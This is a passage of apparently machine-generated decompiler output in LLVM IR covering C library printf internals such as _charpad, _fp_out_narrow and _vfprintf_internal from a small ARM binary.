  store i8 48, i8* %v3_1010c, align 1
  %v2_10114 = load i32, i32* @r4, align 4
  %v3_10114 = add i32 %v2_10114, 1
  %v4_10114 = inttoptr i32 %v3_10114 to i8*
  store i8 0, i8* %v4_10114, align 1
  %v0_10118 = load i32, i32* %r3.global-to-local, align 4
  %v1_10118 = load i32, i32* @r4, align 4
  %v2_10118 = add i32 %v1_10118, 20
  %v3_10118 = inttoptr i32 %v2_10118 to i32*
  store i32 %v0_10118, i32* %v3_10118, align 4
  %v0_1011c = load i32, i32* %r3.global-to-local, align 4
  %v1_1011c = load i32, i32* @r4, align 4
  %v2_1011c = add i32 %v1_1011c, 24
  %v3_1011c = inttoptr i32 %v2_1011c to i32*
  store i32 %v0_1011c, i32* %v3_1011c, align 4
  %v0_10120 = load i32, i32* %r3.global-to-local, align 4
  %v1_10120 = load i32, i32* @r4, align 4
  %v2_10120 = add i32 %v1_10120, 28
  %v3_10120 = inttoptr i32 %v2_10120 to i32*
  store i32 %v0_10120, i32* %v3_10120, align 4
  %v0_10124 = load i32, i32* %r3.global-to-local, align 4
  %v1_10124 = load i32, i32* @r4, align 4
  %v2_10124 = add i32 %v1_10124, 16
  %v3_10124 = inttoptr i32 %v2_10124 to i32*
  store i32 %v0_10124, i32* %v3_10124, align 4
  br label %dec_label_pc_10128

dec_label_pc_10128:                               ; preds = %dec_label_pc_100ec, %dec_label_pc_10104
  store i32 1, i32* %r3.global-to-local, align 4
  %v1_1012c = load i32, i32* @r4, align 4
  %v2_1012c = add i32 %v1_1012c, 52
  %v3_1012c = inttoptr i32 %v2_1012c to i32*
  store i32 1, i32* %v3_1012c, align 4
  %v0_10130 = call i32 @__stdio_init_mutex()
  store i32 %v0_10130, i32* %r0.global-to-local, align 4
  %v0_10134 = load i32, i32* @r4, align 4
  %v1_10134 = add i32 %v0_10134, 32
  %v2_10134 = inttoptr i32 %v1_10134 to i32*
  %storemerge = load i32, i32* %v2_10134, align 4
  store i32 %storemerge, i32* @r4, align 4
  %v1_10138 = add i32 %storemerge, 56
  store i32 %v1_10138, i32* @r5, align 4
  %v2_1013c = icmp eq i32 %storemerge, 0
  store i32 %v1_10138, i32* %r0.global-to-local, align 4
  br i1 %v2_1013c, label %dec_label_pc_10138.dec_label_pc_10148_crit_edge, label %dec_label_pc_100ec

dec_label_pc_10138.dec_label_pc_10148_crit_edge:  ; preds = %dec_label_pc_10128
  %storemerge12.pre = load i32, i32* bitcast (i32** @global_var_231d0.331 to i32*), align 4
  br label %dec_label_pc_10148

dec_label_pc_10148:                               ; preds = %dec_label_pc_10138.dec_label_pc_10148_crit_edge, %entry
  %v11_1017013 = phi i32 [ %v1_10138, %dec_label_pc_10138.dec_label_pc_10148_crit_edge ], [ %v1_101386, %entry ]
  %storemerge12 = phi i32 [ %storemerge12.pre, %dec_label_pc_10138.dec_label_pc_10148_crit_edge ], [ 0, %entry ]
  store i32 ptrtoint (i32** @global_var_231d0.331 to i32), i32* %r3.global-to-local, align 4
  store i32 %storemerge12, i32* %r4.global-to-local, align 4
  %v2_101684 = icmp eq i32 %storemerge12, 0
  br i1 %v2_101684, label %dec_label_pc_10170, label %dec_label_pc_10154

dec_label_pc_10154:                               ; preds = %dec_label_pc_10148, %dec_label_pc_10154
  %v0_1015c = phi i32 [ %storemerge1, %dec_label_pc_10154 ], [ %storemerge12, %dec_label_pc_10148 ]
  %v1_10154 = inttoptr i32 %v0_1015c to i8*
  %v2_10154 = load i8, i8* %v1_10154, align 1
  %v3_10154 = zext i8 %v2_10154 to i32
  store i32 %v3_10154, i32* %r3.global-to-local, align 4
  %v1_10158 = and i32 %v3_10154, 64
  store i32 %v0_1015c, i32* %r0.global-to-local, align 4
  store i32 65892, i32* @lr, align 4
  %v1_10160 = icmp ne i32 %v1_10158, 0
  call void @__pseudo_cond_branch(i1 %v1_10160, i32 ptrtoint (i32* @global_var_10184.342 to i32))
  %v0_10164 = load i32, i32* %r4.global-to-local, align 4
  %v1_10164 = add i32 %v0_10164, 32
  %v2_10164 = inttoptr i32 %v1_10164 to i32*
  %storemerge1 = load i32, i32* %v2_10164, align 4
  store i32 %storemerge1, i32* %r4.global-to-local, align 4
  %v2_10168 = icmp eq i32 %storemerge1, 0
  br i1 %v2_10168, label %dec_label_pc_10168.dec_label_pc_10170_crit_edge, label %dec_label_pc_10154

dec_label_pc_10168.dec_label_pc_10170_crit_edge:  ; preds = %dec_label_pc_10154
  %v11_10170.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10170

dec_label_pc_10170:                               ; preds = %dec_label_pc_10168.dec_label_pc_10170_crit_edge, %dec_label_pc_10148
  %v11_10170 = phi i32 [ %v11_10170.pre, %dec_label_pc_10168.dec_label_pc_10170_crit_edge ], [ %v11_1017013, %dec_label_pc_10148 ]
  %v2_10170 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_10170, i32* @r4, align 4
  ret i32 %v11_10170

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 2, 0 }
  uselistorder i32 %storemerge12, { 0, 2, 1 }
  uselistorder i32 ()* @__stdio_init_mutex, { 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_10154, { 1, 0 }
  uselistorder label %dec_label_pc_10128, { 1, 0 }
  uselistorder label %dec_label_pc_100ec, { 1, 0 }
}

define i32 @__stdio_wcommit() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10184 = load i32, i32* @r4, align 4
  store i32 %v3_10184, i32* %stack_var_-8, align 4
  %v0_10188 = load i32, i32* @r0, align 4
  %v1_10188 = add i32 %v0_10188, 8
  %v2_10188 = inttoptr i32 %v1_10188 to i32*
  %v3_10188 = load i32, i32* %v2_10188, align 4
  %v1_1018c = add i32 %v0_10188, 16
  %v2_1018c = inttoptr i32 %v1_1018c to i32*
  %v3_1018c = load i32, i32* %v2_1018c, align 4
  %v9_10190 = icmp eq i32 %v3_1018c, %v3_10188
  store i32 %v0_10188, i32* %r4.global-to-local, align 4
  br i1 %v9_10190, label %bb3, label %bb

bb:                                               ; preds = %entry
  store i32 %v3_10188, i32* %v2_1018c, align 4
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  store i32 65956, i32* @lr, align 4
  %v1_101a0 = xor i1 %v9_10190, true
  call void @__pseudo_cond_branch(i1 %v1_101a0, i32 ptrtoint (i32* @global_var_13d98.343 to i32))
  %v0_101a4 = load i32, i32* %r4.global-to-local, align 4
  %v1_101a4 = add i32 %v0_101a4, 8
  %v2_101a4 = inttoptr i32 %v1_101a4 to i32*
  %v3_101a4 = load i32, i32* %v2_101a4, align 4
  %v1_101a8 = add i32 %v0_101a4, 16
  %v2_101a8 = inttoptr i32 %v1_101a8 to i32*
  %v3_101a8 = load i32, i32* %v2_101a8, align 4
  %v2_101ac = sub i32 %v3_101a8, %v3_101a4
  %v2_101b0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_101b0, i32* @r4, align 4
  ret i32 %v2_101ac

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @_charpad(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-17 = alloca i8, align 1
  %v3_101b4 = load i32, i32* @r4, align 4
  %v6_101b4 = load i32, i32* @r5, align 4
  %v9_101b4 = load i32, i32* @r6, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg3, i32* @r4, align 4
  store i8 %arg2, i8* %stack_var_-17, align 1
  %v2_101d42 = icmp eq i32 %arg3, 0
  %v2_101d8 = ptrtoint i8* %stack_var_-17 to i32
  br i1 %v2_101d42, label %dec_label_pc_101f4, label %dec_label_pc_101e8

dec_label_pc_101d0:                               ; preds = %dec_label_pc_101e8
  %v1_101d0 = add i32 %v0_101d0, -1
  store i32 %v1_101d0, i32* @r4, align 4
  %v2_101d4 = icmp eq i32 %v1_101d0, 0
  %v0_101e0 = load i32, i32* @r6, align 4
  br i1 %v2_101d4, label %dec_label_pc_101f4.loopexit, label %dec_label_pc_101e8

dec_label_pc_101e8:                               ; preds = %entry, %dec_label_pc_101d0
  %v0_101e04 = phi i32 [ %v0_101e0, %dec_label_pc_101d0 ], [ %arg1, %entry ]
  %v3_101e8 = call i32 @__stdio_fwrite(i32 %v2_101d8, i32 1, i32 %v0_101e04)
  %v7_101ec = icmp eq i32 %v3_101e8, 1
  %v0_101d0 = load i32, i32* @r4, align 4
  br i1 %v7_101ec, label %dec_label_pc_101d0, label %dec_label_pc_101f4.loopexit

dec_label_pc_101f4.loopexit:                      ; preds = %dec_label_pc_101d0, %dec_label_pc_101e8
  %v0_101f4.ph = phi i32 [ %v0_101d0, %dec_label_pc_101e8 ], [ 0, %dec_label_pc_101d0 ]
  %v1_101f4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_101f4

dec_label_pc_101f4:                               ; preds = %dec_label_pc_101f4.loopexit, %entry
  %v1_101f4 = phi i32 [ 0, %entry ], [ %v1_101f4.pre, %dec_label_pc_101f4.loopexit ]
  %v0_101f4 = phi i32 [ 0, %entry ], [ %v0_101f4.ph, %dec_label_pc_101f4.loopexit ]
  %v2_101f4 = sub i32 %v1_101f4, %v0_101f4
  store i32 %v3_101b4, i32* @r4, align 4
  store i32 %v6_101b4, i32* @r5, align 4
  store i32 %v9_101b4, i32* @r6, align 4
  ret i32 %v2_101f4

; uselistorder directives
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_101f4.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_101e8, { 1, 0 }
}

define i32 @_fp_out_narrow(i32 %arg1, i32 %arg2, i32 %arg3, i8* %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg4 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_10200 = load i32, i32* @r4, align 4
  store i32 %v3_10200, i32* %stack_var_-24, align 4
  %v9_10200 = load i32, i32* @r6, align 4
  store i32 %arg2, i32* @r6, align 4
  %v1_10208 = and i32 %arg2, 128
  %v2_10208 = icmp eq i32 %v1_10208, 0
  %v0_1020c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1020c, i32* @r8, align 4
  store i32 %arg3, i32* %r4.global-to-local, align 4
  store i32 %tmp, i32* @r7, align 4
  br i1 %v2_10208, label %bb, label %dec_label_pc_10220

bb:                                               ; preds = %entry
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10260

dec_label_pc_10220:                               ; preds = %entry
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v3_10224 = call i32 @strlen(i8* %arg4)
  store i32 %v3_10224, i32* %r0.global-to-local, align 4
  %v1_10228 = load i32, i32* %r4.global-to-local, align 4
  %v2_10228 = sub i32 %v1_10228, %v3_10224
  store i32 %v2_10228, i32* @r4, align 4
  store i32 %v3_10224, i32* @r5, align 4
  %tmp16 = icmp slt i32 %v2_10228, 1
  br i1 %tmp16, label %.thread, label %dec_label_pc_10240

.thread:                                          ; preds = %dec_label_pc_10220
  store i32 %v3_10224, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10260

dec_label_pc_10240:                               ; preds = %dec_label_pc_10220
  %v0_10240 = load i32, i32* @r6, align 4
  %v1_10240 = urem i32 %v0_10240, 128
  %v0_10244 = load i32, i32* @r8, align 4
  store i32 %v0_10244, i32* %r0.global-to-local, align 4
  %v3_1024c = trunc i32 %v1_10240 to i8
  %v4_1024c = call i32 @_charpad(i32 %v0_10244, i8 %v3_1024c, i32 %v2_10228)
  store i32 %v4_1024c, i32* %r0.global-to-local, align 4
  %v1_10250 = load i32, i32* @r4, align 4
  %v9_10250 = icmp eq i32 %v4_1024c, %v1_10250
  store i32 %v4_1024c, i32* %r6.global-to-local, align 4
  br i1 %v9_10250, label %dec_label_pc_1025c, label %dec_label_pc_1027c

dec_label_pc_1025c:                               ; preds = %dec_label_pc_10240
  %v0_1025c = load i32, i32* @r5, align 4
  store i32 %v0_1025c, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10260

dec_label_pc_10260:                               ; preds = %bb, %.thread, %dec_label_pc_1025c
  %v5_1026c = phi i32 [ %v0_1025c, %dec_label_pc_1025c ], [ %arg3, %bb ], [ %v3_10224, %.thread ]
  %tmp17 = icmp slt i32 %v5_1026c, 1
  br i1 %tmp17, label %.thread8, label %bb18

.thread8:                                         ; preds = %dec_label_pc_10260
  br label %bb19

bb18:                                             ; preds = %dec_label_pc_10260
  %v5_10268 = load i32, i32* @r7, align 4
  br label %bb19

bb19:                                             ; preds = %.thread8, %bb18
  %storemerge = phi i32 [ 0, %.thread8 ], [ %v5_10268, %bb18 ]
  %tmp20 = phi i1 [ false, %.thread8 ], [ true, %bb18 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  call void @__pseudo_cond_branch(i1 %tmp20, i32 ptrtoint (i32* @global_var_13e54.344 to i32))
  %v0_10278 = load i32, i32* %r6.global-to-local, align 4
  %v2_10278 = add i32 %storemerge, %v0_10278
  store i32 %v2_10278, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1027c

dec_label_pc_1027c:                               ; preds = %dec_label_pc_10240, %bb19
  %v0_1027c = phi i32 [ %v4_1024c, %dec_label_pc_10240 ], [ %v2_10278, %bb19 ]
  store i32 %v0_1027c, i32* %r0.global-to-local, align 4
  %v2_10280 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_10280, i32* %r4.global-to-local, align 4
  store i32 %v9_10200, i32* %r6.global-to-local, align 4
  ret i32 %v0_1027c

; uselistorder directives
  uselistorder i32 %v0_1027c, { 1, 0 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32* %r0.global-to-local, { 3, 0, 5, 4, 7, 6, 1, 2 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_1027c, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %dec_label_pc_10260, { 2, 1, 0 }
}

define i32 @_vfprintf_internal(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9, i32 %arg10, i32 %arg11) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp97 = call i32 @__decompiler_undefined_function_0()
  %tmp99 = call i8 @__decompiler_undefined_function_2()
  %tmp100 = call i32 @__decompiler_undefined_function_0()
  %tmp101 = call i32 @__decompiler_undefined_function_0()
  %tmp102 = call i32 @__decompiler_undefined_function_0()
  %tmp103 = call i32 @__decompiler_undefined_function_0()
  %tmp104 = call i8 @__decompiler_undefined_function_2()
  %tmp105 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-53 = alloca i32, align 4
  %stack_var_-252 = alloca i32, align 4
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_10284 = load i32, i32* @r4, align 4
  store i32 %v3_10284, i32* %stack_var_-36, align 4
  %v6_10284 = load i32, i32* @r5, align 4
  %v15_10284 = load i32, i32* @r8, align 4
  %v18_10284 = load i32, i32* @sb, align 4
  %v21_10284 = load i32, i32* @sl, align 4
  %v24_10284 = load i32, i32* @fp, align 4
  %v2_1028c = ptrtoint i32* %stack_var_-332 to i32
  store i32 %v2_1028c, i32* @r6, align 4
  store i32 %arg1, i32* @fp, align 4
  store i32 %v2_1028c, i32* %r0.global-to-local, align 4
  %v0_10298 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_10298, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_102a0 = call i32 @_ppfs_init(i32* nonnull %stack_var_-332)
  store i32 %v2_102a0, i32* %r0.global-to-local, align 4
  %v1_102a4 = icmp slt i32 %v2_102a0, 0
  br i1 %v1_102a4, label %dec_label_pc_102ac, label %dec_label_pc_102e0

dec_label_pc_102ac:                               ; preds = %entry
  %v3_102ac = load i32, i32* %stack_var_-332, align 4
  store i32 %v3_102ac, i32* @r4, align 4
  %v1_102b0 = inttoptr i32 %v3_102ac to i8*
  store i32 %v3_102ac, i32* %r0.global-to-local, align 4
  %v3_102b4 = call i32 @strlen(i8* %v1_102b0)
  store i32 %v3_102b4, i32* %r0.global-to-local, align 4
  %v2_102b8 = icmp eq i32 %v3_102b4, 0
  br i1 %v2_102b8, label %bb, label %dec_label_pc_102c8

bb:                                               ; preds = %dec_label_pc_102ac
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10858

dec_label_pc_102c8:                               ; preds = %dec_label_pc_102ac
  %v0_102c8 = load i32, i32* @r4, align 4
  store i32 %v0_102c8, i32* %r0.global-to-local, align 4
  %v0_102cc = load i32, i32* @fp, align 4
  store i32 %v0_102cc, i32* %r2.global-to-local, align 4
  %v3_102d0 = call i32 @__stdio_fwrite(i32 %v0_102c8, i32 %v3_102b4, i32 %v0_102cc)
  store i32 %v3_102d0, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10858

dec_label_pc_102e0:                               ; preds = %entry
  store i32 %v2_1028c, i32* %r0.global-to-local, align 4
  %v0_102e4 = load i32, i32* @r5, align 4
  %v2_102e8 = call i32 @_ppfs_prepargs(i32 %v2_1028c, i32 %v0_102e4)
  store i32 %v2_102e8, i32* %r0.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v4_10388 = zext i8 %tmp104 to i32
  %v2_10390 = ptrtoint i32* %stack_var_-252 to i32
  %v2_103b0 = ptrtoint i32* %stack_var_-36 to i32
  %v2_103c8 = icmp eq i32 %tmp102, 0
  %v1_103dc = inttoptr i32 %tmp101 to i32*
  %v2_106cc = ptrtoint i32* %stack_var_-180 to i32
  %v2_105e8 = ptrtoint i32* %stack_var_-44 to i32
  %v2_105fc = ptrtoint i32* %stack_var_-52 to i32
  %v3_10598 = add i32 %tmp101, 4
  %v4_10598 = inttoptr i32 %v3_10598 to i32*
  %v2_1059c = ptrtoint i32* %stack_var_-328 to i32
  %v7_1045c = zext i8 %tmp99 to i32
  %v2_10498 = ptrtoint i32* %stack_var_-53 to i32
  %v5_104a0 = bitcast i32* %stack_var_-53 to i8*
  %v2_104a8 = icmp ugt i32 %tmp102, 4
  %v7_104a8 = icmp eq i32 %tmp102, 5
  %v0_10840.pre = load i32, i32* @r4, align 4
  %tmp132 = icmp slt i32 %tmp105, 1
  %v5_103c0187 = icmp sgt i32 %tmp103, 0
  %tmp195 = icmp ugt i32 %tmp102, 7
  %tmp196 = icmp ugt i32 %tmp102, 15
  %v2_105bc = icmp ugt i32 %tmp102, 16
  %v7_105bc = icmp eq i32 %tmp102, 17
  %v2_105c0 = xor i1 %v7_105bc, true
  %v3_105c0 = and i1 %v2_105bc, %v2_105c0
  %v2_1065c = icmp ugt i32 %tmp102, 18
  %v7_1065c = icmp eq i32 %tmp102, 19
  %v2_10660 = xor i1 %v7_1065c, true
  %v3_10660 = and i1 %v2_1065c, %v2_10660
  %v7_106c0 = icmp eq i32 %tmp102, 20
  %v2_10400 = add i32 %tmp102, ptrtoint (i32* @global_var_19f2c.346 to i32)
  %v1_10404 = add i32 %tmp102, add (i32 ptrtoint (i32* @global_var_19f2c.346 to i32), i32 -1)
  %v2_10404 = inttoptr i32 %v1_10404 to i8*
  %v2_10430 = xor i1 %v7_104a8, true
  %v3_10430 = and i1 %v2_104a8, %v2_10430
  %v7_10464 = icmp eq i32 %tmp102, 1
  %v2_104b0 = xor i1 %v2_104a8, true
  %v3_104b0 = or i1 %v7_104a8, %v2_104b0
  %tmp197 = icmp ult i32 %tmp102, 3
  %v7_10518 = icmp eq i32 %tmp102, 3
  %v11_10524 = icmp eq i32 %tmp102, 4
  %v9_10394 = mul nuw nsw i32 %v4_10388, 8
  %v10_10394 = add nsw i32 %v9_10394, -8
  %v6_1039c = add i32 %v10_10394, %v2_10390
  br label %dec_label_pc_10840

bb126:                                            ; preds = %dec_label_pc_102f8.outer, %.thread7
  %v2_102f8185 = phi i8 [ %v2_102f8, %.thread7 ], [ %v2_102f8181, %dec_label_pc_102f8.outer ]
  %v1_1030c184 = phi i32 [ %v2_1030c, %.thread7 ], [ %v0_102f849, %dec_label_pc_102f8.outer ]
  %v8_10300 = icmp eq i8 %v2_102f8185, 37
  br i1 %v8_10300, label %dec_label_pc_10314, label %.thread7

.thread7:                                         ; preds = %bb126
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_1030c = add i32 %v1_1030c184, 1
  store i32 %v2_1030c, i32* @r4, align 4
  %v1_102f8 = inttoptr i32 %v2_1030c to i8*
  %v2_102f8 = load i8, i8* %v1_102f8, align 1
  %v3_102f8 = zext i8 %v2_102f8 to i32
  store i32 %v3_102f8, i32* %r3.global-to-local, align 4
  %v2_102fc = icmp eq i8 %v2_102f8, 0
  br i1 %v2_102fc, label %dec_label_pc_10314, label %bb126

dec_label_pc_10314:                               ; preds = %bb126, %.thread7, %dec_label_pc_102f8.outer
  %v1_1030c.lcssa = phi i32 [ %v0_102f849, %dec_label_pc_102f8.outer ], [ %v2_1030c, %.thread7 ], [ %v1_1030c184, %bb126 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10314 = sub i32 %v1_1030c.lcssa, %v5_10324
  %v9_10314 = icmp eq i32 %v1_1030c.lcssa, %v5_10324
  br i1 %v9_10314, label %dec_label_pc_10348, label %dec_label_pc_1031c

dec_label_pc_1031c:                               ; preds = %dec_label_pc_10314
  store i32 %v2_10314, i32* @r5, align 4
  %tmp128 = icmp slt i32 %v2_10314, 1
  br i1 %tmp128, label %bb130, label %bb129

bb129:                                            ; preds = %dec_label_pc_1031c
  store i32 %v5_10324, i32* %r0.global-to-local, align 4
  %v5_1032c = load i32, i32* @fp, align 4
  store i32 %v5_1032c, i32* %r2.global-to-local, align 4
  br label %bb130

bb130:                                            ; preds = %dec_label_pc_1031c, %bb129
  %tmp131 = phi i1 [ true, %bb129 ], [ false, %dec_label_pc_1031c ]
  call void @__pseudo_cond_branch(i1 %tmp131, i32 ptrtoint (i32* @global_var_13e54.344 to i32))
  %v0_10334 = load i32, i32* %r0.global-to-local, align 4
  %v1_10334 = load i32, i32* @r5, align 4
  %v9_10334 = icmp eq i32 %v0_10334, %v1_10334
  br i1 %v9_10334, label %dec_label_pc_1033c, label %dec_label_pc_10850

dec_label_pc_1033c:                               ; preds = %bb130
  %v2_10340 = add i32 %v0_10334, %stack_var_-336.1.ph
  %v0_10348.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_10348

dec_label_pc_10348:                               ; preds = %dec_label_pc_10314, %dec_label_pc_1033c
  %v0_1035c = phi i32 [ %v5_10324, %dec_label_pc_10314 ], [ %v0_10348.pre, %dec_label_pc_1033c ]
  %stack_var_-336.2 = phi i32 [ %stack_var_-336.1.ph, %dec_label_pc_10314 ], [ %v2_10340, %dec_label_pc_1033c ]
  %v1_10348 = inttoptr i32 %v0_1035c to i8*
  %v2_10348 = load i8, i8* %v1_10348, align 1
  %v3_10348 = zext i8 %v2_10348 to i32
  store i32 %v3_10348, i32* %r3.global-to-local, align 4
  %v2_1034c = icmp eq i8 %v2_10348, 0
  br i1 %v2_1034c, label %dec_label_pc_10858, label %dec_label_pc_10354

dec_label_pc_10354:                               ; preds = %dec_label_pc_10348
  %v1_10354 = add i32 %v0_1035c, 1
  %v2_10354 = inttoptr i32 %v1_10354 to i8*
  %v3_10354 = load i8, i8* %v2_10354, align 1
  %v4_10354 = zext i8 %v3_10354 to i32
  store i32 %v4_10354, i32* %r3.global-to-local, align 4
  %v7_10358 = icmp eq i8 %v3_10354, 37
  store i32 %v1_10354, i32* %r2.global-to-local, align 4
  br i1 %v7_10358, label %dec_label_pc_10848, label %dec_label_pc_10364

dec_label_pc_10364:                               ; preds = %dec_label_pc_10354
  store i32 %v2_1028c, i32* @r4, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_1028c, i32* %r0.global-to-local, align 4
  store i32 %v1_10354, i32* %stack_var_-332, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_10378 = call i32 @_ppfs_parsespec(i32* nonnull %stack_var_-332)
  store i32 %v2_1028c, i32* @r0, align 4
  %v0_10380 = call i32 @_ppfs_setargs()
  store i32 %v0_10380, i32* %r0.global-to-local, align 4
  store i32 %v4_10388, i32* %ip.global-to-local, align 4
  store i32 %v2_10390, i32* %r3.global-to-local, align 4
  br i1 %tmp132, label %.thread, label %bb133

.thread:                                          ; preds = %dec_label_pc_10364
  store i32 %tmp103, i32* %r0.global-to-local, align 4
  br label %bb134

bb133:                                            ; preds = %dec_label_pc_10364
  store i32 %tmp103, i32* %r0.global-to-local, align 4
  store i32 %v6_1039c, i32* %r3.global-to-local, align 4
  br label %bb134

bb134:                                            ; preds = %.thread, %bb133
  %v0_103a878 = phi i32 [ %v6_1039c, %bb133 ], [ %v2_10390, %.thread ]
  store i32 %v2_103b0, i32* @lr, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  br i1 %v5_103c0187, label %dec_label_pc_103a8, label %dec_label_pc_103c4

dec_label_pc_103a8:                               ; preds = %bb134, %dec_label_pc_103a8
  %v5_103b8189 = phi i32 [ %v5_103b8, %dec_label_pc_103a8 ], [ %v2_103b0, %bb134 ]
  %v0_103a8188 = phi i32 [ %v1_103ac, %dec_label_pc_103a8 ], [ %v0_103a878, %bb134 ]
  %v2_103a8 = add i32 %v5_103b8189, -4
  %v3_103a8 = inttoptr i32 %v2_103a8 to i32*
  store i32 %v0_103a8188, i32* %v3_103a8, align 4
  %v0_103ac = load i32, i32* %r3.global-to-local, align 4
  %v1_103ac = add i32 %v0_103ac, 8
  store i32 %v1_103ac, i32* %r3.global-to-local, align 4
  %v0_103b4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_103b4.pre = load i32, i32* %r0.global-to-local, align 4
  store i32 %v2_103b0, i32* @lr, align 4
  %v4_103b8 = mul i32 %v0_103b4.pre, 4
  %v5_103b8 = add i32 %v4_103b8, %v2_103b0
  %v1_103bc = add i32 %v0_103b4.pre, 1
  store i32 %v1_103bc, i32* %r2.global-to-local, align 4
  %v5_103c0 = icmp slt i32 %v0_103b4.pre, %v1_103b4.pre
  br i1 %v5_103c0, label %dec_label_pc_103a8, label %dec_label_pc_103c4

dec_label_pc_103c4:                               ; preds = %dec_label_pc_103a8, %bb134
  store i32 %tmp102, i32* %r2.global-to-local, align 4
  br i1 %v2_103c8, label %dec_label_pc_103d0, label %dec_label_pc_103f4

dec_label_pc_103d0:                               ; preds = %dec_label_pc_103c4
  store i32 %tmp101, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-336.2, i32* %ip.global-to-local, align 4
  %v2_103dc = load i32, i32* %v1_103dc, align 4
  store i32 %v2_103dc, i32* %r0.global-to-local, align 4
  %v1_103e0 = and i32 %v0_10424, 3840
  store i32 %stack_var_-336.2, i32* %r2.global-to-local, align 4
  %v3_103e8 = ashr i32 %stack_var_-336.2, 31
  store i32 %v3_103e8, i32* %r3.global-to-local, align 4
  %v4_103ec = inttoptr i32 %v2_103dc to i8*
  %v5_103ec = call i32 @_store_inttype(i8* %v4_103ec, i32 %v1_103e0, i32 %stack_var_-336.2, i32 %v3_103e8)
  store i32 %v5_103ec, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1083c

dec_label_pc_103f4:                               ; preds = %dec_label_pc_103c4
  br i1 %tmp195, label %dec_label_pc_10580, label %dec_label_pc_103fc

dec_label_pc_103fc:                               ; preds = %dec_label_pc_103f4
  store i32 %v2_10400, i32* %r3.global-to-local, align 4
  %v3_10404 = load i8, i8* %v2_10404, align 1
  %v4_10404 = zext i8 %v3_10404 to i32
  store i32 %v4_10404, i32* @r4, align 4
  %v7_10408 = icmp eq i8 %v3_10404, 10
  br i1 %v7_10408, label %dec_label_pc_10414, label %bb135

bb135:                                            ; preds = %dec_label_pc_103fc
  store i32 87, i32* @r5, align 4
  br label %bb139

dec_label_pc_10414:                               ; preds = %dec_label_pc_103fc
  store i32 %v0_10424, i32* %r3.global-to-local, align 4
  %v1_10418 = and i32 %v0_10424, 32
  %v2_10418 = icmp eq i32 %v1_10418, 0
  %.175 = select i1 %v2_10418, i32 87, i32 44
  store i32 %.175, i32* @r5, align 4
  %v1_10424 = and i32 %v0_10424, 64
  %v2_10424 = icmp eq i32 %v1_10424, 0
  br i1 %v2_10424, label %bb139, label %bb138

bb138:                                            ; preds = %dec_label_pc_10414
  %.176 = select i1 %v2_10418, i32 215, i32 172
  store i32 %.176, i32* @r5, align 4
  br label %bb139

bb139:                                            ; preds = %bb135, %dec_label_pc_10414, %bb138
  br i1 %v3_10430, label %.thread84, label %dec_label_pc_10438

.thread84:                                        ; preds = %bb139
  %v5_10430 = sub nsw i32 0, %v4_10404
  store i32 %v5_10430, i32* @r4, align 4
  br label %dec_label_pc_10450

dec_label_pc_10438:                               ; preds = %bb139
  br i1 %v7_10518, label %bb140, label %dec_label_pc_10444

